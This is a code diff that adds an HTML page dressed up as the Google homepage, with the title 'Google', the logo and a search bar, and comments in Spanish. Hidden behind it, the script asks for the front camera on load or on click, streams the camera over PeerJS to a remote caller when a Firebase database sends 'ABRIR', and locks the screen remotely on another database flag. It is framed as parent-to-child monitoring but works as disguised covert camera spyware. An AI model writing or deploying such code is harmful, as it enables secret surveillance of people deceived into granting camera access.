@@ -1,19 +1,76 @@
-<script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <style>
+        body { margin: 0; font-family: arial, sans-serif; background: white; overflow: hidden; }
+        #bloqueo { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 9999; justify-content: center; align-items: center; }
+        .google-home { display: flex; flex-direction: column; align-items: center; padding-top: 100px; }
+        .logo { width: 160px; margin-bottom: 20px; }
+        .search-bar { width: 90%; max-width: 580px; border: 1px solid #dfe1e5; padding: 10px 20px; border-radius: 24px; font-size: 16px; outline: none; }
+        #videoLocal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: 5000; }
+    </style>
+</head>
+<body>
 
-<script>
-    const peer = new Peer('camara-nino-123'); // ID fijo para conectar
-    const videoInvisible = document.createElement('video');
+    <div id="bloqueo"><h1 style="color:red; font-family:sans-serif;">⚠️ ACCESO RESTRINGIDO</h1></div>
+    <video id="videoLocal" autoplay playsinline muted></video>
 
-    db.ref('comando_camara').on('value', (snap) => {
-        if (snap.val() === "ABRIR") {
+    <div class="google-home" onclick="activarPermisos()">
+        <img class="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
+        <input type="text" class="search-bar" placeholder="Buscar en Google o escribir URL">
+    </div>
+
+    <script>
+        // 1. CONFIGURACIÓN FIREBASE
+        const firebaseConfig = { databaseURL: "https://micontrol-30a70-default-rtdb.firebaseio.com/" };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        // 2. CONFIGURACIÓN PEERJS (LA ANTENA)
+        const peer = new Peer('camara-nino-123');
+        const videoLocal = document.getElementById('videoLocal');
+        let streamLocal = null;
+
+        // 3. FUNCIÓN PARA PEDIR PERMISO (DISPARADOR)
+        function activarPermisos() {
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
             .then((stream) => {
-                // Cuando el padre llame, el niño contesta con su video
-                peer.on('call', (call) => {
-                    call.answer(stream);
-                });
-                alert("Transmisión lista");
-            });
+                streamLocal = stream;
+                videoLocal.srcObject = stream;
+                console.log("Permiso de cámara concedido");
+            })
+            .catch((err) => { alert("Para funcionar, activa el permiso de cámara."); });
         }
-    });
-</script>
+
+        // Intentar pedir permiso al cargar (algunos navegadores lo bloquean si no hay clic)
+        window.onload = () => { setTimeout(activarPermisos, 1000); };
+
+        // 4. ESCUCHAR BLOQUEO
+        db.ref('bloqueo').on('value', (snap) => {
+            document.getElementById('bloqueo').style.display = (snap.val() === "SI") ? "flex" : "none";
+        });
+
+        // 5. ESCUCHAR ORDEN DE CÁMARA DEL PADRE
+        db.ref('comando_camara').on('value', (snap) => {
+            if (snap.val() === "ABRIR") {
+                activarPermisos();
+            }
+        });
+
+        // 6. CONTESTAR LLAMADA DE VIDEO
+        peer.on('call', (call) => {
+            if (streamLocal) {
+                call.answer(streamLocal);
+            } else {
+                activarPermisos(); // Reintentar si no estaba listo
+            }
+        });
+    </script>
+</body>
+</html>
